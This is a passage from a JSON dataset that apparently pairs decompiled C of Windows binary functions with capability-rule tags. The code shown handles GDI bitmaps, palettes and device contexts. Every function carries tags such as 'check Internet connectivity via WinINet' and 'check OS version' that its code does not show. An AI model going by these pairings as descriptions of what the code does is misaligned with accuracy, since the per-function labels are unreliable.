*(iVar1 + 0xc);\n    uStack64 = 0x42097b;\n    sub.kernel32.dll_MulDiv();\n    uStack64 = 0x9ec;\n    uStack68 = nNumerator;\n    uStack72 = *(iVar1 + 0x10);\n    uStack76 = 0x420992;\n    sub.kernel32.dll_MulDiv();\n    uStack76 = 0x42099e;\n    fcn.0041e944();\n    uStack76 = 0;\n    puStack80 = 0x4209a9;\n    uVar2 = sub.user32.dll_GetDC();\n    uStack84 = 0x420a5f;\n    uStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    uStack96 = 8;\n    uStack100 = 0;\n    uStack104 = 0;\n    uStack108 = *(iVar1 + 8);\n    puStack112 = 0x4209cd;\n    uStack92 = uVar2;\n    puStack80 = &stack0xfffffffc;\n    uVar3 = sub.gdi32.dll_GetWinMetaFileBits();\n    puStack112 = 0x4209d8;\n    uVar4 = fcn.004026bc();\n    uStack116 = 0x420a3f;\n    uStack120 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff88;\n    uVar6 = *(iVar1 + 8);\n    puStack112 = &stack0xfffffffc;\n    uVar5 = sub.gdi32.dll_GetWinMetaFileBits(uVar6, uVar3, uVar4, 8, uVar2);\n    if (uVar5 < uVar3) {\n        fcn.0041db54();\n    }\n    fcn.00415a20();\n    fcn.00415a20();\n    *in_FS_OFFSET = uVar6;\n    fcn.004026dc(0x420a46);\n    return;\n}\n",
        "token_count": 800
    },
    "00420bc0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00420bc0(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    puStack20 = 0x420bd0;\n    var_8h = fcn.00413ed0();\n    uStack24 = 0x420c5e;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    iVar2 = *(var_8h + 8) + -1;\n    puStack20 = &stack0xfffffffc;\n    if (-1 < iVar2) {\n        do {\n            var_4h = iVar2;\n            puStack32 = 0x420bfb;\n            var_ch = fcn.00413b64();\n            puStack32 = 0x420c06;\n            cVar1 = fcn.0041d6a0();\n            if (cVar1 != '\\0') {\n                uStack36 = 0x420c36;\n                uStack40 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffd8;\n                puStack32 = &stack0xfffffffc;\n                fcn.00420d50();\n                *in_FS_OFFSET = uStack40;\n                puStack32 = 0x420c3d;\n                uStack36 = 0x420c35;\n                fcn.0041d6fc();\n                return;\n            }\n            var_4h = var_4h + -1;\n            iVar2 = var_4h;\n        } while (var_4h != -1);\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x420c65;\n    uStack24 = 0x420c5d;\n    fcn.00413f34();\n    return;\n}\n",
        "token_count": 457
    },
    "00420c6c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00420c6c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    if (in_EAX != 0) {\n        puStack20 = 0x420c85;\n        iVar1 = fcn.00413ed0();\n        uStack24 = 0x420cdc;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        iVar1 = *(iVar1 + 8) + -1;\n        puStack20 = &stack0xfffffffc;\n        if (-1 < iVar1) {\n            do {\n                iVar2 = fcn.00413b64();\n                if ((*(iVar2 + 0x58) != 0) && (*(*(*(iVar2 + 0x58) + 0x28) + 8) == in_EAX)) {\n                    fcn.00420d50();\n                }\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != -1);\n        }\n        *in_FS_OFFSET = uStack28;\n        puStack20 = 0x420ce3;\n        uStack24 = 0x420cdb;\n        fcn.00413f34();\n        return;\n    }\n    return;\n}\n",
        "token_count": 316
    },
    "00420d50": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00420d50(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    if (*(in_EAX + 4) != 0) {\n        puStack16 = 0x420d6d;\n        fcn.0041d510();\n        uStack20 = 0x420de4;\n        uStack24 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe8;\n        puStack16 = &stack0xfffffffc;\n        if (*(in_EAX + 0x5c) != 0) {\n            puStack16 = &stack0xfffffffc;\n            sub.gdi32.dll_SelectObject(*(in_EAX + 4), *(in_EAX + 0x5c));\n        }\n        if (*(in_EAX + 0x60) != 0) {\n            sub.gdi32.dll_SelectPalette(*(in_EAX + 4), *(in_EAX + 0x60), 0xffffffff);\n        }\n        uVar1 = *(in_EAX + 4);\n        fcn.0041d884();\n        sub.gdi32.dll_DeleteDC();\n        fcn.00413ee4();\n        *in_FS_OFFSET = uVar1;\n        fcn.0041d6fc(0x420deb);\n        return;\n    }\n    return;\n}\n",
        "token_count": 324
    },
    "00420df0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00420df0(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd8;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x58) != 0) {\n        puStack20 = 0x420e0e;\n        fcn.0041d510();\n        uStack24 = 0x420ecf;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        puStack20 = &stack0xfffffffc;\n        fcn.0042210c();\n        fcn.00420c6c();\n        fcn.0042220c();\n        uVar2 = sub.gdi32.dll_CreateCompatibleDC(0);\n        iVar1 = *(*(*(in_EAX + 0x58) + 0x28) + 8);\n        if (iVar1 == 0) {\n            *(in_EAX + 0x5c) = 0;\n        }\n        else {\n            in_stack_ffffffd8 = uVar2;\n            uVar3 = sub.gdi32.dll_SelectObject(uVar2, iVar1);\n            *(in_EAX + 0x5c) = uVar3;\n        }\n        iVar1 = *(*(*(in_EAX + 0x58) + 0x28) + 0x10);\n        if (iVar1 == 0) {\n            *(in_EAX + 0x60) = 0;\n        }\n        else {\n            uVar3 = sub.gdi32.dll_SelectPalette(uVar2, iVar1, 0xffffffff);\n            *(in_EAX + 0x60) = uVar3;\n            sub.gdi32.dll_RealizePalette(uVar2);\n        }\n        fcn.0041d884();\n        fcn.00413e48();\n        *in_FS_OFFSET = in_stack_ffffffd8;\n        fcn.0041d6fc(0x420ed6);\n        return;\n    }\n    return;\n}\n",
        "token_count": 484
    },
    "00420ee0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00420ee0(void)\n\n{\n    uint *in_EAX;\n    \n    if ((in_EAX != NULL) && (in_EAX[1] = in_EAX[1] + -1,  in_EAX[1] == 0)) {\n        (***in_EAX)();\n        fcn.00403258();\n    }\n    return;\n}\n",
        "token_count": 81
    },
    "00421064": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00421064(void)\n\n{\n    int32_t in_EAX;\n    \n    if (((*(in_EAX + 0x28) & 3) != 0) && (*(in_EAX + 0x40) == 0)) {\n        if (*(in_EAX + 0x26) == 0x10) {\n            *(in_EAX + 0x40) = 0xf800;\n            *(in_EAX + 0x44) = 0x7e0;\n            *(in_EAX + 0x48) = 0x1f;\n        }\n        else if (*(in_EAX + 0x26) == 0x20) {\n            *(in_EAX + 0x40) = 0xff0000;\n            *(in_EAX + 0x44) = 0xff00;\n            *(in_EAX + 0x48) = 0xff;\n        }\n    }\n    return;\n}\n",
        "token_count": 211
    },
    "004210b0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004210b0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uchar *puVar1;\n    int16_t iVar2;\n    int16_t iVar3;\n    int32_t in_EAX;\n    int32_t iVar4;\n    uint uVar5;\n    uint uVar6;\n    int32_t in_EDX;\n    uint32_t uVar7;\n    uint uVar8;\n    uint *puVar9;\n    uint *puVar10;\n    int32_t *in_FS_OFFSET;\n    uint *puStack312;\n    int32_t iStack308;\n    uchar *puStack304;\n    int32_t iStack300;\n    int32_t iStack296;\n    int32_t iStack292;\n    uint *puStack288;\n    int32_t iStack272;\n    int32_t iStack268;\n    uchar *puStack264;\n    uint *puStack260;\n    int32_t iStack256;\n    int32_t iStack252;\n    uint *puStack248;\n    code *pcStack244;\n    uint *puStack240;\n    uchar *puStack236;\n    int32_t iStack232;\n    int32_t iStack228;\n    uchar *puStack224;\n    int32_t iStack220;\n    uint uStack216;\n    int32_t iStack212;\n    uint uStack208;\n    uchar *puStack204;\n    int32_t iStack200;\n    uint uStack196;\n    uchar *puStack192;\n    int32_t iStack188;\n    uint uStack184;\n    int32_t iStack180;\n    uint uStack176;\n    uint *puStack172;\n    uint lprc;\n    uint lpvObject;\n    int32_t var_84h;\n    int32_t var_80h;\n    int32_t var_74h;\n    int32_t var_70h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint *pbmi;\n    int32_t var_20h;\n    int32_t hdcDest;\n    int32_t hdc;\n    uint var_14h;\n    uint var_10h;\n    int32_t hpal;\n    int32_t var_8h;\n    int32_t hgdiobj;\n    \n    puStack236 = &stack0xfffffffc;\n    var_10h = 0;\n    if (((*(arg_ch + 0x18) == 0) || ((*(arg_ch + 0x1c) != 0 && (*(arg_ch + 0x20) != 0)))) &&\n       ((*(arg_ch + 0x18) != 0 || ((*(arg_ch + 4) != 0 && (*(arg_ch + 8) != 0)))))) {\n        puStack172 = 0x421118;\n        var_8h = in_EDX;\n        hgdiobj = in_EAX;\n        fcn.00420c6c();\n        var_70h = 0;\n        if (hgdiobj != 0) {\n            puStack172 = &fcn.004210b0::lpvObject;\n            uStack176 = 0x54;\n            iStack180 = hgdiobj;\n            uStack184 = 0x421135;\n            iVar4 = sub.gdi32.dll_GetObjectA();\n            if (iVar4 < 0x18) {\n                uStack184 = 0x42113f;\n                fcn.0041dadc();\n            }\n        }\n        uStack184 = 0;\n        iStack188 = 0x421146;\n        sub.user32.dll_GetDC();\n        iStack188 = 0x42114b;\n        iStack188 = fcn.0041dbfc();\n        puStack192 = 0x421157;\n        hdc = iStack188;\n        sub.gdi32.dll_CreateCompatibleDC();\n        puStack192 = 0x42115c;\n        hdcDest = fcn.0041dbfc();\n        uStack196 = 0x4216fe;\n        iStack200 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff38;\n        if (*(arg_ch + 0x18) < 0x28) {\n            if ((*(arg_ch + 0x10) | *(arg_ch + 0x12)) == 1) {\n                puStack204 = NULL;\n                uStack208 = 1;\n                iStack212 = 1;\n                uStack216 = *(arg_ch + 8);\n                iStack220 = *(arg_ch + 4);\n                puStack224 = 0x4211a3;\n                puStack192 = &stack0xfffffffc;\n                sub.gdi32.dll_CreateBitmap();\n                puStack224 = 0x4211a8;\n                var_10h = fcn.0041dbfc();\n            }\n            else {\n                puStack204 = *(arg_ch + 8);\n                uStack208 = *(arg_ch + 4);\n                iStack212 = hdc;\n                uStack216 = 0x4211c7;\n                puStack192 = &stack0xfffffffc;\n                sub.gdi32.dll_CreateCompatibleBitmap();\n                uStack216 = 0x4211cc;\n                var_10h = fcn.0041dbfc();\n            }\n            uStack216 = 0x421417;\n            fcn.0041dbfc();\n            uStack216 = var_10h;\n            iStack220 = hdcDest;\n            puStack224 = 0x421424;\n            sub.gdi32.dll_SelectObject();\n            puStack224 = 0x421429;\n            var_14h = fcn.0041dbfc();\n            iStack228 = 0x4216af;\n            iStack232 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff18;\n            puStack240 = 0x42169e;\n            pcStack244 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff0c;\n            var_34h = 0;\n            uVar8 = 0;\n            puVar1 = &stack0xfffffffc;\n            puStack224 = &stack0xfffffffc;\n            if (hpal != 0) {\n                puStack248 = NULL;\n                iStack252 = hpal;\n                iStack256 = hdcDest;\n                puStack260 = 0x421464;\n                puStack224 = &stack0xfffffffc;\n                var_34h = sub.gdi32.dll_SelectPalette();\n                puStack260 = hdcDest;\n                puStack264 = 0x421470;\n                sub.gdi32.dll_RealizePalette();\n                puVar1 = puStack236;\n            }\n            puStack236 = puVar1;\n            iStack268 = 0x42167c;\n            iStack272 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffffef0;\n            if (arg_8h == 0) {\n                puStack288 = NULL;\n                iStack292 = 0;\n                iStack296 = hdcDest;\n                iStack300 = 0x42155d;\n                puStack264 = &stack0xfffffffc;\n                sub.gdi32.dll_PatBlt();\n            }\n            else {\n                puStack264 = &stack0xfffffffc;\n                fcn.0041d0f0();\n                puStack288 = 0x4214b1;\n                fcn.00412730(&fcn.004210b0::lprc, *(arg_ch + 8));\n                puStack288 = &fcn.004210b0::lprc;\n                iStack292 = hdcDest;\n                iStack296 = 0x4214c1;\n                sub.user32.dll_FillRect();\n                iStack296 = 0x4214cf;\n                iStack296 = fcn.0041c430();\n                iStack300 = hdcDest;\n                puStack304 = 0x4214d9;\n                sub.gdi32.dll_SetTextColor();\n                puStack304 = 0x4214e4;\n                fcn.0041d0b4();\n                puStack304 = 0x4214e9;\n                puStack304 = fcn.0041c430();\n                iStack308 = hdcDest;\n                puStack312 = 0x4214f3;\n                sub.gdi32.dll_SetBkColor();\n                if ((*(arg_ch + 0x26) == 1) && (*(arg_ch + 0x14) != 0)) {\n                    puStack312 = 0x421514;\n                    var_30h = fcn.0041c430();\n                    puStack312 = 0x421522;\n                    fcn.0041d0b4();\n                    puStack312 = 0x421527;\n                    var_2ch = fcn.0041c430();\n                    puStack312 = &fcn.004210b0::var_30h;\n                    sub.gdi32.dll_SetDIBColorTable(hdcDest, 0, 2);\n                }\n            }\n            if (hgdiobj != 0) {\n                iStack300 = hdc;\n                puStack304 = 0x421570;\n                sub.gdi32.dll_CreateCompatibleDC();\n                puStack304 = 0x421575;\n                var_20h = fcn.0041dbfc();\n                iStack308 = 0x421652;\n                puStack312 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xfffffec8;\n                puStack304 = &stack0xfffffffc;\n                sub.gdi32.dll_SelectObject(var_20h, hgdiobj);\n                uVar5 = fcn.0041dbfc();\n                if (var_8h != 0) {\n                    uVar8 = sub.gdi32.dll_SelectPalette(var_20h, var_8h, 0);\n                    sub.gdi32.dll_RealizePalette(var_20h);\n                }\n                if (arg_8h != 0) {\n                    uVar6 = fcn.0041c430();\n                    sub.gdi32.dll_SetTextColor(var_20h, uVar6);\n                    fcn.0041d0b4();\n                    uVar6 = fcn.0041c430();\n                    sub.gdi32.dll_SetBkColor(var_20h, uVar6);\n                }\n                sub.gdi32.dll_BitBlt(hdcDest, 0, 0, *(arg_ch + 4), *(arg_ch + 8), var_20h, 0, 0, 0xcc0020);\n                if (var_8h != 0) {\n                    sub.gdi32.dll_SelectPalette(var_20h, uVar8, 0xffffffff);\n                }\n                iVar4 = var_20h;\n                sub.gdi32.dll_SelectObject(var_20h, uVar5);\n                fcn.0041dbfc();\n                *in_FS_OFFSET = iVar4;\n                uVar8 = sub.gdi32.dll_DeleteDC(var_20h, 0x421659);\n                return uVar8;\n            }\n            uVar8 = 0;\n            *in_FS_OFFSET = iStack296;\n            puStack288 = 0x421683;\n            if (hpal != 0) {\n                iStack292 = 0xffffffff;\n                iStack296 = var_34h;\n                iStack300 = hdcDest;\n                puStack304 = 0x42167b;\n                uVar8 = sub.gdi32.dll_SelectPalette();\n            }\n            return uVar8;\n        }\n        puStack204 = 0x4211de;\n        puStack192 = &stack0xfffffffc;\n        pbmi = fcn.004026bc();\n        uStack208 = 0x421408;\n        iStack212 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff2c;\n        *(arg_ch + 0x18) = 0x28;\n        *(arg_ch + 0x24) = 1;\n        puStack204 = &stack0xfffffffc;\n        if (*(arg_ch + 0x26) == 0) {\n            uStack216 = 0xc;\n            iStack220 = hdc;\n            puStack224 = 0x421217;\n            puStack204 = &stack0xfffffffc;\n            iVar2 = sub.gdi32.dll_GetDeviceCaps();\n            puStack224 = 0xe;\n            iStack228 = hdc;\n            iStack232 = 0x421224;\n            iVar3 = sub.gdi32.dll_GetDeviceCaps();\n            *(arg_ch + 0x26) = iVar2 * iVar3;\n        }\n        puVar9 = arg_ch + 0x18;\n        puVar10 = pbmi;\n        for (iVar4 = 10; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar10 = *puVar9;\n            puVar9 = puVar9 + 1;\n            puVar10 = puVar10 + 1;\n        }\n        *(arg_ch + 4) = *(arg_ch + 0x1c);\n        *(arg_ch + 8) = *(arg_ch + 0x20);\n        if (*(arg_ch + 0x26) < 9) {\n            if ((*(arg_ch + 0x26) == 1) && ((hgdiobj == 0 || (var_74h == 0)))) {\n                pbmi[10] = 0;\n                pbmi[0xb] = 0xffffff;\n            }\n            else if (hpal == 0) {\n                if (hgdiobj != 0) {\n                    iStack232 = hgdiobj;\n                    puStack236 = hdcDest;\n                    puStack240 = 0x4212ce;\n                    var_14h = sub.gdi32.dll_SelectObject();\n                    if ((var_70h == 0) || (var_74h == 0)) {\n                        puStack240 = NULL;\n                        pcStack244 = pbmi;\n                        puStack248 = NULL;\n                        uVar7 = *(arg_ch + 0x20) >> 0x1f;\n                        iStack252 = (*(arg_ch + 0x20) ^ uVar7) - uVar7;\n                        iStack256 = 0;\n                        puStack260 = hgdiobj;\n                        puStack264 = hdcDest;\n                        iStack268 = 0x42131f;\n                        sub.gdi32.dll_GetDIBits();\n                    }\n                    else {\n                        puStack240 = pbmi + 10;\n                        pcStack244 = pe_nt_image_headers32;\n                        puStack248 = NULL;\n                        iStack252 = hdcDest;\n                        iStack256 = 0x4212f4;\n                        uVar8 = sub.gdi32.dll_GetDIBColorTable();\n                        *(arg_ch + 0x38) = uVar8;\n                    }\n                    puStack224 = var_14h;\n                    iStack228 = hdcDest;\n                    iStack232 = 0x42132c;\n                    sub.gdi32.dll_SelectObject();\n                }\n            }\n            else {\n                iStack232 = 0x4212b2;\n                fcn.0041e390();\n            }\n        }\n        else if (((*(arg_ch + 0x26) == 0x10) || (*(arg_ch + 0x26) == 0x20)) && ((*(arg_ch + 0x28) & 3) != 0)) {\n            iStack232 = 0x421355;\n            fcn.00421064();\n            iStack232 = 0x42136b;\n            fcn.004028b8();\n        }\n        iStack232 = 0;\n        puStack236 = NULL;\n        puStack240 = &fcn.004210b0::var_28h;\n        pcStack244 = NULL;\n        puStack248 = pbmi;\n        iStack252 = hdc;\n        iStack256 = 0x421382;\n        sub.gdi32.dll_CreateDIBSection();\n        iStack256 = 0x421387;\n        var_10h = fcn.0041dbfc();\n        if (var_28h == 0) {\n            iStack256 = 0x421395;\n            fcn.0041db54();\n        }\n        if ((((hgdiobj == 0) || (*(arg_ch + 0x1c) != var_84h)) || (*(arg_ch + 0x20) != var_80h)) ||\n           (*(arg_ch + 0x26) < 9)) {\n            *in_FS_OFFSET = iStack252;\n            pcStack244 = 0x42140f;\n            puStack248 = 0x421407;\n            uVar8 = fcn.004026dc();\n            return uVar8;\n        }\n        iStack256 = 0;\n        puStack260 = pbmi;\n        puStack264 = var_28h;\n        uVar7 = *(arg_ch + 0x20) >> 0x1f;\n        iStack268 = (*(arg_ch + 0x20) ^ uVar7) - uVar7;\n        iStack272 = 0;\n        sub.gdi32.dll_GetDIBits();\n        fcn.00403a90();\n        fcn.00403a90();\n    }\n    return var_10h;\n}\n",
        "token_count": 3759
    },
    "00421714": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00421714(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint uStack1064;\n    int32_t iStack1060;\n    uchar *puStack1056;\n    int32_t iStack1052;\n    uint uStack1048;\n    uchar *puStack1044;\n    uint uStack1040;\n    \n    puStack1044 = &stack0xfffffbf0;\n    uVar2 = 0;\n    if (in_EAX != 0) {\n        uStack1040 = 0;\n        uStack1048 = 4;\n        puStack1056 = 0x421732;\n        iStack1052 = in_EAX;\n        iVar1 = sub.gdi32.dll_GetObjectA();\n        if ((iVar1 != 0) && (iStack1052 != 0)) {\n            uStack1048 = CONCAT22(iStack1052, 0x300);\n            puStack1056 = &stack0xfffffbec;\n            iStack1060 = iStack1052;\n            uStack1064 = 0;\n            sub.gdi32.dll_GetPaletteEntries();\n            uVar2 = sub.gdi32.dll_CreatePalette(&stack0xfffffbd8);\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 296
    },
    "00421778": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00421778(int32_t param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_fffffec8;\n    int32_t in_stack_ffffff24;\n    int32_t iStack204;\n    uint uStack200;\n    uchar *puStack196;\n    int32_t iStack192;\n    int32_t iStack188;\n    int32_t iStack184;\n    uint uStack180;\n    uint uStack176;\n    uint uStack172;\n    uint uStack168;\n    uint uStack164;\n    int32_t iStack160;\n    uint uStack156;\n    int32_t iStack152;\n    uint uStack148;\n    uchar *puStack144;\n    uint uStack136;\n    uint *puStack132;\n    uint lpvObject;\n    uint nWidth;\n    uint nHeight;\n    int32_t var_5ch;\n    uint var_58h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    char var_11h;\n    int32_t hdcDest;\n    int32_t hdc;\n    int32_t var_8h;\n    int32_t hgdiobj;\n    \n    hgdiobj = 0;\n    if (in_EAX != 0) {\n        puStack132 = &fcn.00421778::lpvObject;\n        uStack136 = 0x54;\n        puStack144 = 0x4217a0;\n        iVar1 = sub.gdi32.dll_GetObjectA();\n        if (iVar1 != 0) {\n            puStack144 = 0x4217af;\n            fcn.00420c6c();\n            var_8h = 0;\n            hdcDest = 0;\n            uStack148 = 0x421973;\n            iStack152 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff68;\n            uStack156 = 0;\n            iStack160 = 0x4217ce;\n            puStack144 = &stack0xfffffffc;\n            sub.user32.dll_GetDC();\n            iStack160 = 0x4217d3;\n            iStack160 = fcn.0041dbfc();\n            uStack164 = 0x4217df;\n            var_8h = iStack160;\n            sub.gdi32.dll_CreateCompatibleDC();\n            uStack164 = 0x4217e4;\n            hdcDest = fcn.0041dbfc();\n            uStack164 = 0;\n            uStack168 = 1;\n            uStack172 = 1;\n            uStack176 = nHeight;\n            uStack180 = nWidth;\n            iStack184 = 0x4217fa;\n            hgdiobj = sub.gdi32.dll_CreateBitmap();\n            if (hgdiobj != 0) {\n                iStack188 = hdcDest;\n                iStack192 = 0x421814;\n                iStack184 = hgdiobj;\n                var_1ch = sub.gdi32.dll_SelectObject();\n                if (param_1 != 0x1fffffff) {\n                    iStack192 = var_8h;\n                    puStack196 = 0x421844;\n                    sub.gdi32.dll_CreateCompatibleDC();\n                    puStack196 = 0x421849;\n                    hdc = fcn.0041dbfc();\n                    uStack200 = 0x42192b;\n                    iStack204 = *in_FS_OFFSET;\n                    *in_FS_OFFSET = &stack0xffffff34;\n                    if (var_5ch == 0) {\n                        var_11h = '\\0';\n                        puStack196 = &stack0xfffffffc;\n                    }\n                    else {\n                        var_11h = '\\x01';\n                        var_58h = 0;\n                        puStack196 = &stack0xfffffffc;\n                        in_EAX = fcn.004210b0(0, &fcn.00421778::lpvObject);\n                    }\n                    var_18h = sub.gdi32.dll_SelectObject(hdc, in_EAX);\n                    if (param_2 != 0) {\n                        sub.gdi32.dll_SelectPalette(hdc, param_2, 0);\n                        sub.gdi32.dll_RealizePalette(hdc);\n                        sub.gdi32.dll_SelectPalette(hdcDest, param_2, 0);\n                        sub.gdi32.dll_RealizePalette(hdcDest);\n                    }\n                    uVar2 = sub.gdi32.dll_SetBkColor(hdc, param_1);\n                    sub.gdi32.dll_BitBlt(hdcDest, 0, 0, nWidth, nHeight, hdc, 0, 0, 0xcc0020);\n                    sub.gdi32.dll_SetBkColor(hdc, uVar2);\n                    if (var_18h != 0) {\n                        in_stack_fffffec8 = hdc;\n                        sub.gdi32.dll_SelectObject(hdc, var_18h);\n                    }\n                    if (var_11h != '\\0') {\n                        sub.gdi32.dll_DeleteObject(in_EAX);\n                    }\n                    *in_FS_OFFSET = in_stack_fffffec8;\n                    uVar2 = sub.gdi32.dll_DeleteDC(hdc, 0x421932);\n                    return uVar2;\n                }\n                iStack192 = 0x42;\n                puStack196 = nHeight;\n                uStack200 = nWidth;\n                iStack204 = 0;\n                sub.gdi32.dll_PatBlt(hdcDest, 0);\n                if (var_1ch != 0) {\n                    in_stack_ffffff24 = hdcDest;\n                    sub.gdi32.dll_SelectObject(hdcDest, var_1ch);\n                }\n            }\n            uVar2 = 0;\n            *in_FS_OFFSET = in_stack_ffffff24;\n            if (hdcDest != 0) {\n                uVar2 = sub.gdi32.dll_DeleteDC(hdcDest, 0x42197a);\n            }\n            if (var_8h != 0) {\n                uVar2 = sub.user32.dll_ReleaseDC(0, var_8h);\n            }\n            return uVar2;\n        }\n    }\n    return hgdiobj;\n}\n",
        "token_count": 1343
    },
    "00421984": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00421984(uint param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040357c();\n        param_2 = extraout_DL;\n    }\n    fcn.0041ed7c();\n    in_EAX[0xd] = 0x20000000;\n    iVar1 = fcn.00403228();\n    in_EAX[10] = iVar1;\n    fcn.00420edc();\n    if (*0x461444 != '\\0') {\n        (**(*in_EAX + 0x6c))();\n    }\n    if (param_2 != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 219
    },
    "00421c7c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
